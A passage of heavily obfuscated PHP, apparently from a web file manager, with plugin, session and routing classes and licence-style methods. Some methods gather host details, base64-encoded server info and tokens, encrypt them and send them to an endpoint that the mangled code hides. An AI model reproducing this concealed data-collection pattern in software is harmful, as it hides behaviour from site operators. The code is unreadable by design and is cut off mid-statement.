$³¶‚•İ = false) { $´œ¹½ô =& $_SERVER[ªÏ§Ë·]; $Ù€—şÉµ = array(); $«¸ğ¼÷¹ = $this->loadList($İÄÒæ´×); if ($«¸ğ¼÷¹ && is_array($«¸ğ¼÷¹[$´œ¹½ô[6]])) { $Ù€—şÉµ = $«¸ğ¼÷¹[$´œ¹½ô[6]]; } if (!$Ù€—şÉµ || $³¶‚•İ) { $Ù€—şÉµ = $this->getConfigDefault($İÄÒæ´×); } return $Ù€—şÉµ; } public function setConfig($ñ—…İò¾, $‹ë—œ³ = false) { $÷ºù˜·Å =& $_SERVER[ªÏ§Ë·]; $¼Àº€€ = $this->loadList($ñ—…İò¾); if (!$¼Àº€€) { return !1; } $İ°®ñì§ = $¼Àº€€[$÷ºù˜·Å[6]]; if ($‹ë—œ³ == !1) { $İ°®ñì§ = array(); $‹ë—œ³ = $this->getConfigDefault($ñ—…İò¾); } foreach ($‹ë—œ³ as $ˆóõñêã => $í¾Ì“èË) { $İ°®ñì§[$ˆóõñêã] = is_string($í¾Ì“èË) ? trim($í¾Ì“èË) : $í¾Ì“èË; } $this->update($¼Àº€€[$÷ºù˜·Å[437]], array($÷ºù˜·Å[6] => $İ°®ñì§)); } public function viewList() { $ışÕ‡ú® =& $_SERVER[ªÏ§Ë·]; $”™ßü– = $this->loadList(); $this->pluginScan($”™ßü–); $”™ßü– = $this->loadPluginList(); $ÆøŸÖâÎ = array(); foreach ($”™ßü– as $û¯©„¡ => $¾±ñ¶¯é) { unset($¾±ñ¶¯é[$ışÕ‡ú®[1978]], $¾±ñ¶¯é[$ışÕ‡ú®[6]]); $«ÌºÆäª = PLUGIN_DIR . $¾±ñ¶¯é[$ışÕ‡ú®[42]] . $ışÕ‡ú®[1980]; if (!is_file($«ÌºÆäª)) { continue; } $ƒ §Ò÷ = Hook::apply($¾±ñ¶¯é[$ışÕ‡ú®[42]] . $ışÕ‡ú®[1988]); if (is_array($ƒ §Ò÷)) { $ÆøŸÖâÎ[$û¯©„¡] = array_merge($¾±ñ¶¯é, $ƒ §Ò÷); } } return $ÆøŸÖâÎ; } private function loadPluginList() { $µÖñ½š =& $_SERVER[ªÏ§Ë·]; $öä‰ºŒÁ = $this->loadList(); if (strtolower(MOD) == $µÖñ½š[1989]) { return $öä‰ºŒÁ; } $ç¯Ùƒü = Hook::trigger($µÖñ½š[1990], $öä‰ºŒÁ); if ($öä‰ºŒÁ && !$ç¯Ùƒü) { die; } return $ç¯Ùƒü ? $ç¯Ùƒü : $öä‰ºŒÁ; } private function pluginScan($´ğèüé) { $Î„·»Š… =& $_SERVER[ªÏ§Ë·]; recursion_dir(PLUGIN_DIR, $ÅºÆÛæ, $—£¢ëÄº, 0); foreach ($ÅºÆÛæ as $ÛúñÆõ‡) { $©¦âıù° = get_path_this($ÛúñÆõ‡); if (isset($´ğèüé[$©¦âıù°]) || !file_exists($ÛúñÆõ‡ . $Î„·»Š…[1991]) || !file_exists($ÛúñÆõ‡ . $Î„·»Š…[1980])) { continue; } Hook::apply($©¦âıù° . $Î„·»Š…[1985]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\x6d\137\163\x65\163\163\x69\157\x6e"; public function get($¬®ğŞ†) { $‡Ü¹Ä¢Á =& $_SERVER[ªÏ§Ë·]; $”ßÃ°› = $this->where(array($‡Ü¹Ä¢Á[1992] => $¬®ğŞ†))->find(); if (!is_array($”ßÃ°›)) { return !1; } return $”ßÃ°›[$‡Ü¹Ä¢Á[782]]; } public function set($Í¹úñŸÖ, $ù°ÆÊŞ¶, $Ôè¸¶ô¹ = 3600) { $™å®“ùÊ =& $_SERVER[ªÏ§Ë·]; $×‰ßò´À = array($™å®“ùÊ[1992] => $Í¹úñŸÖ, $™å®“ùÊ[1896] => $ù°ÆÊŞ¶, $™å®“ùÊ[1993] => $Ôè¸¶ô¹ + time()); if (Session::get($™å®“ùÊ[1994])) { $×‰ßò´À[$™å®“ùÊ[1667]] = Session::get($™å®“ùÊ[1994]); } else { $×‰ßò´À[$™å®“ùÊ[1667]] = 0; } if ($this->get($Í¹úñŸÖ)) { return $this->where(array($™å®“ùÊ[1992] => $Í¹úñŸÖ))->save($×‰ßò´À); } else { return $this->add($×‰ßò´À, array(), !0); } } public function remove($‘İ²ª§Ø) { return $this->where(array($_SERVER[ªÏ§Ë·][1992] => $‘İ²ª§Ø))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ªÏ§Ë·][1995] . time())->delete(); } } goto CÌ·“§¬Ší; Cö¦šÂœø¼: class Application { private $defaultModule = "\151\x6e\x64\145\170"; private $defaultController = "\x69\x6e\144\x65\x78"; private $defaultAction = "\x69\156\x64\x65\x78"; function __construct() { } public function setDefault($ëÒÕ³–ü) { $”Ÿâ—Òš =& $_SERVER[ªÏ§Ë·]; $š¼´ô²“ =& $_SERVER[ÊõàˆØ]; $¯¬­×êî = explode($š¼´ô²“[0], trim($ëÒÕ³–ü, $š¼´ô²“[0])); $›¾Œ„ä = $”Ÿâ—Òš[649]; $this->defaultModule = $¯¬­×êî[0] ? $¯¬­×êî[0] : $this->defaultModule; $this->defaultController = $¯¬­×êî[1] ? $¯¬­×êî[1] : $this->defaultController; $this->defaultAction = $¯¬­×êî[2] ? $¯¬­×êî[2] : $this->defaultAction; $•Ñ¾Ü±¿ = $”Ÿâ—Òš[650]; $this->ixbq09cfc894($š¼´ô²“[1], array($this, $š¼´ô²“[2])); $äÎ¨„• = $”Ÿâ—Òš[651]; } public function appRun($Û†ëÕ®) { $© §á•¥ =& $_SERVER[ªÏ§Ë·]; $ÂªçÕö =& $_SERVER[ÊõàˆØ]; $úŸ×“Å‚ = explode($ÂªçÕö[0], $Û†ëÕ®); $¥œØ¡·’ = $© §á•¥[652]; while ($¥œØ¡·’ < $© §á•¥[653]) { if ($¥œØ¡·’ >= 0) { break; } $¥œØ¡·’++; } $ÊšÖ°¼ = strtolower($úŸ×“Å‚[0]); $¿…µ§Ó = $ÂªçÕö[3]; $ÇıÑÉ„¼ = $© §á•¥[654]; if (!$ÇıÑÉ„¼) { die; } if ($ÊšÖ°¼ == $ÂªçÕö[4]) { $¿…µ§Ó = $ÂªçÕö[5]; $úŸ×“Å‚[0] = $ÂªçÕö[6]; $úŸ×“Å‚[1] = $úŸ×“Å‚[1] . $ÂªçÕö[7]; $Û†ëÕ® = join($ÂªçÕö[0], $úŸ×“Å‚); $Û†ëÕ® = trim($Û†ëÕ®, $ÂªçÕö[0]); } call_user_func(array($ÂªçÕö[8], $ÂªçÕö[9]), $¿…µ§Ó . $ÂªçÕö[10], $Û†ëÕ®); ActionCall($Û†ëÕ®); call_user_func(array($ÂªçÕö[8], $ÂªçÕö[9]), $¿…µ§Ó . $ÂªçÕö[11], $Û†ëÕ®); } private function autorun() { $ÍÄªè‰¡ =& $_SERVER[ÊõàˆØ]; global $config; $àÅœÒ¾± = $_SERVER[ªÏ§Ë·][655]; if (count($config[$ÍÄªè‰¡[12]]) == 0) { return; } foreach ($config[$ÍÄªè‰¡[12]] as $ŸÁÒÀ¯Ç => $¨¤´ƒÖå) { $this->appRun($¨¤´ƒÖå); } } private function vdnj62acc7da() { $¤Üë‹ıç =& $_SERVER[ªÏ§Ë·]; $è¦œ¢¢ =& $_SERVER[ÊõàˆØ]; $¶íÌàÏñ = $è¦œ¢¢[4]; $É¯±ŠèÕ = $GLOBALS[$è¦œ¢¢[13]][$è¦œ¢¢[14]][0]; $Ÿ˜áşÖ½ = $¤Üë‹ıç[656]; while ($Ÿ˜áşÖ½ < $¤Üë‹ıç[653]) { if ($Ÿ˜áşÖ½ >= 0) { break; } $Ÿ˜áşÖ½++; } if (!$É¯±ŠèÕ || strlen($É¯±ŠèÕ) <= strlen($¶íÌàÏñ)) { return; } if (strtolower(substr($É¯±ŠèÕ, -strlen($¶íÌàÏñ))) != $¶íÌàÏñ) { return; } $û¥¤Ñ“è = substr($É¯±ŠèÕ, 0, -strlen($¶íÌàÏñ)); $™îÑÇŒØ = $¤Üë‹ıç[657]; $êÊÎîÛû = array($è¦œ¢¢[4], $û¥¤Ñ“è); $ÂåğØ¦÷ = array_slice($GLOBALS[$è¦œ¢¢[13]][$è¦œ¢¢[14]], 1); $Æó’Ä”¡ = $¤Üë‹ıç[658]; if (!$Æó’Ä”¡) { die; } $GLOBALS[$è¦œ¢¢[13]][$è¦œ¢¢[14]] = array_merge($êÊÎîÛû, $ÂåğØ¦÷); $GLOBALS[$è¦œ¢¢[13]][$è¦œ¢¢[15]] = implode($è¦œ¢¢[0], $GLOBALS[$è¦œ¢¢[13]][$è¦œ¢¢[14]]); } private function jbcv0c7aaeac() { $ŒÙœÈ» =& $_SERVER[ªÏ§Ë·]; $Â’Âşê¥ =& $_SERVER[ÊõàˆØ]; if ($GLOBALS[$Â’Âşê¥[13]][$Â’Âşê¥[15]] != $Â’Âşê¥[6]) { return; } $†¾í¯”¾ = $_SERVER[$Â’Âşê¥[16]]; $Üè„úÔÓ = $Â’Âşê¥[17]; $ú€€Ç  = $ŒÙœÈ»[659]; if (!$ú€€Ç ) { die; } if (!strstr($†¾í¯”¾, $Üè„úÔÓ)) { return; } $şé‘¸˜æ = strrpos($†¾í¯”¾, $Üè„úÔÓ); $ÅÏ¼¯Åø = substr($†¾í¯”¾, $şé‘¸˜æ + strlen($Üè„úÔÓ)); $û’ƒÅè = $ŒÙœÈ»[660]; preg_match_all($Â’Âşê¥[18], $ÅÏ¼¯Åø, $–Òü·éñ); $ÊƒÀ½Şñ = $ŒÙœÈ»[661]; while (strlen($ÊƒÀ½Şñ) < $ŒÙœÈ»[645]) { if (!$ÊƒÀ½Şñ) { break; } $ÊƒÀ½Şñ++; } $ÅÏ¼¯Åø = trim($–Òü·éñ[0][0], $Â’Âşê¥[19]); $GLOBALS[$Â’Âşê¥[13]][$Â’Âşê¥[14]] = explode($Â’Âşê¥[19], $ÅÏ¼¯Åø); $GLOBALS[$Â’Âşê¥[13]][$Â’Âşê¥[15]] = implode($Â’Âşê¥[0], $GLOBALS[$Â’Âşê¥[13]][$Â’Âşê¥[14]]); } public function run() { $Ò’ÓÓ»º =& $_SERVER[ªÏ§Ë·]; $úäÂÚ³ =& $_SERVER[ÊõàˆØ]; $this->jbcv0c7aaeac(); $ÊÏê©¶˜ = $Ò’ÓÓ»º[662]; while ($ÊÏê©¶˜ < $Ò’ÓÓ»º[20]) { if ($ÊÏê©¶˜ >= 0) { break; } $ÊÏê©¶˜++; } $this->vdnj62acc7da(); $¿ ©¨Ğ = $GLOBALS[$úäÂÚ³[13]][$úäÂÚ³[14]]; $¨ˆšú¾ã = $Ò’ÓÓ»º[663]; $¥¾ıÅ¼„ = $GLOBALS[$úäÂÚ³[13]][$úäÂÚ³[15]]; define($úäÂÚ³[20], isset($¿ ©¨Ğ[0]) && $¿ ©¨Ğ[0] ? $¿ ©¨Ğ[0] : $this->defaultModule); $¸Œ¢¤…Š = $Ò’ÓÓ»º[664]; if (strlen($¸Œ¢¤…Š) < $Ò’ÓÓ»º[665]) { die; } define($úäÂÚ³[21], isset($¿ ©¨Ğ[1]) && $¿ ©¨Ğ[0] ? $¿ ©¨Ğ[1] : $this->defaultController); $ô‚Ş¼ÆÃ = $Ò’ÓÓ»º[666]; while (strlen($ô‚Ş¼ÆÃ) < $Ò’ÓÓ»º[20]) { if (!$ô‚Ş¼ÆÃ) { break; } $ô‚Ş¼ÆÃ++; } define($úäÂÚ³[22], isset($¿ ©¨Ğ[2]) && $¿ ©¨Ğ[0] ? $¿ ©¨Ğ[2] : $this->defaultAction); $¨óî„¿³ = $Ò’ÓÓ»º[667]; if (!$¨óî„¿³) { die; } define($úäÂÚ³[23], MOD . $úäÂÚ³[0] . ST . $úäÂÚ³[0] . ACT); $”í–ôÄä = $Ò’ÓÓ»º[668]; while (strlen($”í–ôÄä) < $Ò’ÓÓ»º[653]) { if (!$”í–ôÄä) { break; } $”í–ôÄä++; } $_SERVER[$úäÂÚ³[24]] = strtolower(ACTION); $Ãâ¨Ûúî = $Ò’ÓÓ»º[669]; while ($Ãâ¨Ûúî < $Ò’ÓÓ»º[20]) { if ($Ãâ¨Ûúî >= 0) { break; } $Ãâ¨Ûúî++; } $this->autorun(); $À˜¦Âëœ = $Ò’ÓÓ»º[670]; while ($À˜¦Âëœ < $Ò’ÓÓ»º[671]) { if ($À˜¦Âëœ >= 0) { break; } $À˜¦Âëœ++; } if (count($¿ ©¨Ğ) >= 3) { $this->appRun($¥¾ıÅ¼„); } else { $this->appRun(ACTION); } } private $gubi95e30457 = array(); private $rwqd4ae3dfc7 = ''; public function eotx4bccd486() { $³èâ“Â =& $_SERVER[ªÏ§Ë·]; $˜¾ûûË‚ =& $_SERVER[ÊõàˆØ]; $this->wrux5c2f5a0a(); $this->jxug0a9f4781(); $ó£…şãĞ = $³èâ“Â[672]; if (!$ó£…şãĞ) { die; } $this->nukj9e390a84(); $this->plgy3a414848(); $—ÑÅÙëŒ = $³èâ“Â[673]; if (strlen($—ÑÅÙëŒ) < $³èâ“Â[645]) { return; } $this->majpd883560c(); $Ï‰¹º ù = $³èâ“Â[674]; while ($Ï‰¹º ù < $³èâ“Â[645]) { if ($Ï‰¹º ù >= 0) { break; } $Ï‰¹º ù++; } $this->blqpc5e824f8(); $this->iqnaceee4211(); $ò–â³£Í = $³èâ“Â[675]; if (!$ò–â³£Í) { return; } $this->ixbq09cfc894($˜¾ûûË‚[25], array($this, $˜¾ûûË‚[26])); $this->ixbq09cfc894($˜¾ûûË‚[27], array($this, $˜¾ûûË‚[28])); $this->ixbq09cfc894($˜¾ûûË‚[29], array($this, $˜¾ûûË‚[30])); $üæÏêû« = $³èâ“Â[676]; while (strlen($üæÏêû«) < $³èâ“Â[665]) { if (!$üæÏêû«) { break; } $üæÏêû«++; } $this->ixbq09cfc894($˜¾ûûË‚[31], array($this, $˜¾ûûË‚[32])); $ØîÑøç¥ = $³èâ“Â[677]; while ($ØîÑøç¥ < $³èâ“Â[665]) { if ($ØîÑøç¥ >= 0) { break; } $ØîÑøç¥++; } } public function ilsa86777e7a($ªêòÅŒ) { $¥­é»ƒÖ =& $_SERVER[ªÏ§Ë·]; $¯ Áõ×¾ =& $_SERVER[ÊõàˆØ]; $ˆ–¶Ëºı = Model($¯ Áõ×¾[33])->get(); $£ÚÅú¡ = array($¯ Áõ×¾[34], $¯ Áõ×¾[35], $¯ Áõ×¾[36], $¯ Áõ×¾[37], $¯ Áõ×¾[38], $¯ Áõ×¾[39], $¯ Áõ×¾[40], $¯ Áõ×¾[41], $¯ Áõ×¾[42], $¯ Áõ×¾[43], $¯ Áõ×¾[44], $¯ Áõ×¾[45], $¯ Áõ×¾[46], $¯ Áõ×¾[47], $¯ Áõ×¾[48], $¯ Áõ×¾[49], $¯ Áõ×¾[50], $¯ Áõ×¾[51], $¯ Áõ×¾[52], $¯ Áõ×¾[53], $¯ Áõ×¾[54], $¯ Áõ×¾[55], $¯ Áõ×¾[56], $¯ Áõ×¾[57], $¯ Áõ×¾[58], $¯ Áõ×¾[59], $¯ Áõ×¾[60], $¯ Áõ×¾[61], $¯ Áõ×¾[62], $¯ Áõ×¾[63], $¯ Áõ×¾[64], $¯ Áõ×¾[65], $¯ Áõ×¾[66], $¯ Áõ×¾[67], $¯ Áõ×¾[68], $¯ Áõ×¾[69], $¯ Áõ×¾[70], $¯ Áõ×¾[71], $¯ Áõ×¾[72], $¯ Áõ×¾[73], $¯ Áõ×¾[74], $¯ Áõ×¾[75], $¯ Áõ×¾[76], $¯ Áõ×¾[77], $¯ Áõ×¾[78], $¯ Áõ×¾[79], $¯ Áõ×¾[80], $¯ Áõ×¾[81], $¯ Áõ×¾[82], $¯ Áõ×¾[83], $¯ Áõ×¾[84]); foreach ($£ÚÅú¡ as $°¾¸×ù) { $×Õ¬ˆ»ş = $GLOBALS[$¯ Áõ×¾[85]][$¯ Áõ×¾[86]][$°¾¸×ù]; $èˆÀÈ–ğ = $¥­é»ƒÖ[678]; if (isset($ˆ–¶Ëºı[$°¾¸×ù])) { $×Õ¬ˆ»ş = $ˆ–¶Ëºı[$°¾¸×ù]; } $ªêòÅŒ[$¯ Áõ×¾[87]][$¯ Áõ×¾[88]][$°¾¸×ù] = $×Õ¬ˆ»ş; } $³‡ÒÖ = $ªêòÅŒ[$¯ Áõ×¾[87]][$¯ Áõ×¾[88]][$¯ Áõ×¾[46]]; $¯è™»›å = $¥­é»ƒÖ[679]; unset($ªêòÅŒ[$¯ Áõ×¾[87]][$¯ Áõ×¾[89]][$¯ Áõ×¾[90]]); unset($ªêòÅŒ[$¯ Áõ×¾[87]][$¯ Áõ×¾[89]][$¯ Áõ×¾[91]]); $†â¾Æü¸ = $¥­é»ƒÖ[677]; unset($ªêòÅŒ[$¯ Áõ×¾[87]][$¯ Áõ×¾[88]][$¯ Áõ×¾[46]]); $ã·°â‹ = $¥­é»ƒÖ[680]; unset($ªêòÅŒ[$¯ Áõ×¾[87]][$¯ Áõ×¾[88]][$¯ Áõ×¾[92]]); $µ¥÷œ = $¥­é»ƒÖ[681]; if (strlen($µ¥÷œ) < $¥­é»ƒÖ[645]) { return; } $ªêòÅŒ[$¯ Áõ×¾[87]][$¯ Áõ×¾[88]][$¯ Áõ×¾[93]] = array($¯ Áõ×¾[94] => (int) $³‡ÒÖ[$¯ Áõ×¾[95]], $¯ Áõ×¾[96] => (int) _get($³‡ÒÖ, $¯ Áõ×¾[97], 0)); $¢Ì×÷ª‘ = $¥­é»ƒÖ[682]; if (strlen($¢Ì×÷ª‘) < $¥­é»ƒÖ[20]) { return; } $ªêòÅŒ[$¯ Áõ×¾[98]][$¯ Áõ×¾[99]] = Action($¯ Áõ×¾[100])->accessToken(); $­»ğè«È = $¥­é»ƒÖ[683]; while ($­»ğè«È < $¥­é»ƒÖ[20]) { if ($­»ğè«È >= 0) { break; } $­»ğè«È++; } $ªêòÅŒ[$¯ Áõ×¾[98]][$¯ Áõ×¾[101]] = md5($_SERVER[$¯ Áõ×¾[102]] . $ˆ–¶Ëºı[$¯ Áõ×¾[103]]); $íØˆù™ = $¥­é»ƒÖ[684]; if (!$íØˆù™) { die; } $ªêòÅŒ[$¯ Áõ×¾[98]][$¯ Áõ×¾[104]] = base64_encode(serverInfo()); $ªêòÅŒ[$¯ Áõ×¾[98]][$¯ Áõ×¾[105]] = $this->rwqd4ae3dfc7; if ($ˆ–¶Ëºı[$¯ Áõ×¾[105]] != $¯ Áõ×¾[106]) { $ªêòÅŒ[$¯ Áõ×¾[98]][$¯ Áõ×¾[107]] = $ˆ–¶Ëºı[$¯ Áõ×¾[107]]; $ªêòÅŒ[$¯ Áõ×¾[98]][$¯ Áõ×¾[108]] = $ˆ–¶Ëºı[$¯ Áõ×¾[108]]; $•´ †õÈ = rand_string(10) . $this->rwqd4ae3dfc7 . rand_string(5); $ªêòÅŒ[$¯ Áõ×¾[87]][$¯ Áõ×¾[109]][$¯ Áõ×¾[110]] = $this->moglbab0f06c($•´ †õÈ, $ªêòÅŒ[$¯ Áõ×¾[98]][$¯ Áõ×¾[101]]); } if ($this->rwqd4ae3dfc7 == $¯ Áõ×¾[106]) { $ªêòÅŒ[$¯ Áõ×¾[87]][$¯ Áõ×¾[88]][$¯ Áõ×¾[93]][$¯ Áõ×¾[97]] = 0; } $ªêòÅŒ[$¯ Áõ×¾[98]][$¯ Áõ×¾[111]] = _get($this->gubi95e30457, $¯ Áõ×¾[112], $¯ Áõ×¾[6]); $ªêòÅŒ[$¯ Áõ×¾[98]][$¯ Áõ×¾[113]] = _get($this->gubi95e30457, $¯ Áõ×¾[114], $¯ Áõ×¾[6]); if (_get($GLOBALS, $¯ Áõ×¾[115]) && $this->config[$¯ Áõ×¾[116]]) { $ªêòÅŒ[$¯ Áõ×¾[98]][$¯ Áõ×¾[117]] = WEB_ROOT; } return $ªêòÅŒ; } private function blqpc5e824f8() { $»‚©Œ­« =& $_SERVER[ªÏ§Ë·]; $çÛ’•‡Â =& $_SERVER[ÊõàˆØ]; $Õ»½™‹ô = $_SERVER[$çÛ’•‡Â[24]] == $çÛ’•‡Â[118]; $óÅ íœ¬ = $»‚©Œ­«[685]; while ($óÅ íœ¬ < $»‚©Œ­«[20]) { if ($óÅ íœ¬ >= 0) { break; } $óÅ íœ¬++; } if ($_SERVER[$çÛ’•‡Â[24]] == $çÛ’•‡Â[119] && $_GET[$çÛ’•‡Â[120]] == $çÛ’•‡Â[121]) { $Õ»½™‹ô = !0; } if ($Õ»½™‹ô) { $»Ãï£§ì = array($çÛ’•‡Â[105] => $this->rwqd4ae3dfc7, $çÛ’•‡Â[122] => $this->lafs660461e5(), $çÛ’•‡Â[123] => Model($çÛ’•‡Â[124])->count()); if ($this->rwqd4ae3dfc7 != $çÛ’•‡Â[106]) { $ûÄ×»Š¿ = _get($this->gubi95e30457, $çÛ’•‡Â[125]); if ($ûÄ×»Š¿) { $»Ãï£§ì[$çÛ’•‡Â[126]] = $ûÄ×»Š¿; $»Ãï£§ì[$çÛ’•‡Â[127]] = strtotime(_get($this->gubi95e30457, $çÛ’•‡Â[128])); $»Ãï£§ì[$çÛ’•‡Â[129]] = _get($this->gubi95e30457, $çÛ’•‡Â[114]); } $µëÅ„Ø÷ = Model($çÛ’•‡Â[33])->get($çÛ’•‡Â[130], $çÛ’•‡Â[6], !0); if (is_string($µëÅ„Ø÷) && substr($µëÅ„Ø÷, 0, 1) == $çÛ’•‡Â[131]) { $µëÅ„Ø÷ = json_decode_force($µëÅ„Ø÷); } if (is_array($µëÅ„Ø÷) && $µëÅ„Ø÷[$çÛ’•‡Â[132]] && strstr($µëÅ„Ø÷[$çÛ’•‡Â[132]], $çÛ’•‡Â[133])) { $š°©—û« = explode($çÛ’•‡Â[133], $µëÅ„Ø÷[$çÛ’•‡Â[132]]); $»Ãï£§ì[$çÛ’•‡Â[134]] = $š°©—û«[0]; } } $»Ãï£§ì = $this->jfwp4fa98d32(json_encode($»Ãï£§ì), md5($çÛ’•‡Â[135])); $ ³ÇÒˆŞ = $»‚©Œ­«[686]; $—î£ŞÁå = array($çÛ’•‡Â[136] => $»Ãï£§ì); call_user_func(array($çÛ’•‡Â[137], $çÛ’•‡Â[138]), $—î£ŞÁå); } if ($this->rwqd4ae3dfc7 == $çÛ’•‡Â[106]) { return; } $¶Œ¨„Ä™ = array($çÛ’•‡Â[139], $çÛ’•‡Â[140], $çÛ’•‡Â[141], $çÛ’•‡Â[142], $çÛ’•‡Â[143], $çÛ’•‡Â[144]); $øæ½š = $»‚©Œ­«[687]; while (strlen($øæ½š) < $»‚©Œ­«[665]) { if (!$øæ½š) { break; } $øæ½š++; } $«¿»‹á = Model($çÛ’•‡Â[33])->get(); $—î£ŞÁå = array($çÛ’•‡Â[145] => $«¿»‹á[$çÛ’•‡Â[34]], $çÛ’•‡Â[146] => $«¿»‹á[$çÛ’•‡Â[35]], $çÛ’•‡Â[147] => $çÛ’•‡Â[6]); $íõ©åæ³ = $»‚©Œ­«[688]; foreach ($¶Œ¨„Ä™ as $•õÈ™‡) { if (!isset($«¿»‹á[$•õÈ™‡]) || !$«¿»‹á[$•õÈ™‡]) { continue; } $—î£ŞÁå[$•õÈ™‡] = $«¿»‹á[$•õÈ™‡]; $ ˜”ÓÇ‰ = $»‚©Œ­«[689]; } call_user_func(array($çÛ’•‡Â[137], $çÛ’•‡Â[138]), $—î£ŞÁå); $«¥áà° = $»‚©Œ­«[690]; if (strlen($«¥áà°) < $»‚©Œ­«[20]) { die; } } private function plgy3a414848() { $æñ†í Ã =& $_SERVER[ªÏ§Ë·]; $ÏİÙ³üË =& $_SERVER[ÊõàˆØ]; if ($_SERVER[$ÏİÙ³üË[24]] != $ÏİÙ³üË[148]) { return; } if (!_get($GLOBALS, $ÏİÙ³üË[115])) { die; } $„ïª’ö = $GLOBALS[$ÏİÙ³üË[13]]; if (isset($„ïª’ö[$ÏİÙ³üË[149]])) { $this->ywht716a6ed0(); die; } if (!isset($„ïª’ö[$ÏİÙ³üË[150]]) || strlen($„ïª’ö[$ÏİÙ³üË[150]]) != 16) { show_json($ÏİÙ³üË[151] . $„ïª’ö[$ÏİÙ³üË[150]], !1); } $³˜õ€˜ = Model($ÏİÙ³üË[33])->get($ÏİÙ³üË[103]); $şÍœšê÷ = md5($_SERVER[$ÏİÙ³üË[102]] . $³˜õ€˜); $¾ÉÔ©®¶ = $æñ†í Ã[691]; while ($¾ÉÔ©®¶ < $æñ†í Ã[653]) { if ($¾ÉÔ©®¶ >= 0) { break; } $¾ÉÔ©®¶++; } $Ã„ÓëÇŸ = array($ÏİÙ³üË[150] => $„ïª’ö[$ÏİÙ³üË[150]], $ÏİÙ³üË[152] => rand_string(16), $ÏİÙ³üË[153] => $ÏİÙ³üË[135], $ÏİÙ³üË[154] => $ÏİÙ³üË[155], $ÏİÙ³üË[156] => $_SERVER[$ÏİÙ³üË[157]], $ÏİÙ³üË[158] => $_SERVER[$ÏİÙ³üË[159]], $ÏİÙ³üË[160] => $_SERVER[$ÏİÙ³üË[161]], $ÏİÙ³üË[101] => $şÍœšê÷, $ÏİÙ³üË[162] => Model($ÏİÙ³üË[33])->get($ÏİÙ³üË[130])); if ($„ïª’ö[$ÏİÙ³üË[163]] == $ÏİÙ³üË[164]) { $›Èß¥”í = $this->jfwp4fa98d32($şÍœšê÷, $ÏİÙ³üË[165]); $Ğ‚»Œ¢¹ = $this->moglbab0f06c(json_encode($Ã„ÓëÇŸ), $şÍœšê÷ . $ÏİÙ³üË[166], 3); $Ğ‚»Œ¢¹ = $Ğ‚»Œ¢¹ . $ÏİÙ³üË[167] . $_SERVER[$ÏİÙ³üË[157]]; $„ö³Çò = $this->bhdsbef9e82e($ÏİÙ³üË[168] . $›Èß¥”í . $ÏİÙ³üË[169] . $Ğ‚»Œ¢¹, -1); show_json($„ö³Çò, !0); } else { if ($„ïª’ö[$ÏİÙ³üË[163]] == $ÏİÙ³üË[170]) { $¯Ó¦ù·Ò = substr(md5($ÏİÙ³üË[171] . $şÍœšê÷), 12, 15) . $ÏİÙ³üË[172]; $Ğ‚»Œ¢¹ = $this->pchk9afd611b(trim($„ïª’ö[$ÏİÙ³üË[173]]), $¯Ó¦ù·Ò, 2); $öˆåÕ™Ù = json_decode($Ğ‚»Œ¢¹, !0); if (!is_array($öˆåÕ™Ù) || !is_array($öˆåÕ™Ù[$ÏİÙ³üË[174]]) || $öˆåÕ™Ù[$ÏİÙ³üË[150]] != !0) { $åÀğ¾¡® = $ÏİÙ³üË[175]; $Ğª¹ÇÈİ = $öˆåÕ™Ù[$ÏİÙ³üË[174]] ? $ÏİÙ³üË[176] . $öˆåÕ™Ù[$ÏİÙ³üË[174]] : $åÀğ¾¡®; show_json($Ğª¹ÇÈİ, !1); } else { $Ã„ÓëÇŸ[$ÏİÙ³üË[152]] = $öˆåÕ™Ù[$ÏİÙ³üË[174]][$ÏİÙ³üË[177]]; } } else { $öˆåÕ™Ù = $this->bhdsbef9e82e($ÏİÙ³üË[178], $Ã„ÓëÇŸ, 10); } } if (!is_array($öˆåÕ™Ù) || !is_array($öˆåÕ™Ù[$ÏİÙ³üË[174]]) || $öˆåÕ™Ù[$ÏİÙ³üË[150]] != !0) { $åÀğ¾¡® = LNG($ÏİÙ³üË[179]); $Ğª¹ÇÈİ = $öˆåÕ™Ù[$ÏİÙ³üË[174]] ? $ÏİÙ³üË[176] . $öˆåÕ™Ù[$ÏİÙ³üË[174]] : $åÀğ¾¡®; show_json($Ğª¹ÇÈİ, !1); } $Î—éÖÛä = $öˆåÕ™Ù[$ÏİÙ³üË[174]]; $ŠúÉ¤²Ó = $this->epxv364baebe($Î—éÖÛä[$ÏİÙ³üË[180]]); if (!$ŠúÉ¤²Ó || $ŠúÉ¤²Ó != $Î—éÖÛä[$ÏİÙ³üË[128]]) { $¶Ü­ô‚¼ = array($ÏİÙ³üË[181] => Model($ÏİÙ³üË[33])->get($ÏİÙ³üË[103]), $ÏİÙ³üË[182] => $_SERVER[$ÏİÙ³üË[102]], $ÏİÙ³üË[183] => this_url(), $ÏİÙ³üË[158] => $_SERVER[$ÏİÙ³üË[159]]); $Ğ‚»Œ¢¹ = $this->gcbxdd8ba441(json_encode($¶Ü­ô‚¼)); $this->bhdsbef9e82e($ÏİÙ³üË[184] . $Ğ‚»Œ¢¹); show_json(LNG($ÏİÙ³üË[185]), !0); } $…ÜèÍ—› = array($ÏİÙ³üË[186] => $Î—éÖÛä[$ÏİÙ³üË[187]], $ÏİÙ³üË[188] => $Î—éÖÛä[$ÏİÙ³üË[189]], $ÏİÙ³üË[190] => rand_string(16), $ÏİÙ³üË[105] => $Î—éÖÛä[$ÏİÙ³üË[191]]); if ($Ã„ÓëÇŸ[$ÏİÙ³üË[152]]) { $…ÜèÍ—›[$ÏİÙ³üË[190]] = $Ã„ÓëÇŸ[$ÏİÙ³üË[152]]; } $¤Ï½„¼Ç = substr(md5($…ÜèÍ—›[$ÏİÙ³üË[188]]), 10, 10); $ƒÃÚõ•ñ = $¤Ï½„¼Ç . $…ÜèÍ—›[$ÏİÙ³üË[105]] . $…ÜèÍ—›[$ÏİÙ³üË[190]]; $™À¼ÁÇ® = $æñ†í Ã[692]; while ($™À¼ÁÇ® < $æñ†í Ã[653]) { if ($™À¼ÁÇ® >= 0) { break; } $™À¼ÁÇ®++; } $…ÜèÍ—›[$ÏİÙ³üË[107]] = strrev(base64_encode($this->jfwp4fa98d32($ƒÃÚõ•ñ, $ÏİÙ³üË[192]))); $¡Šº˜àû = $æñ†í Ã[693]; $ó¤¹¾ìÒ = rand_string(16); $ú›Ù “ = $ó¤¹¾ìÒ . $…ÜèÍ—›[$ÏİÙ³üË[105]] . 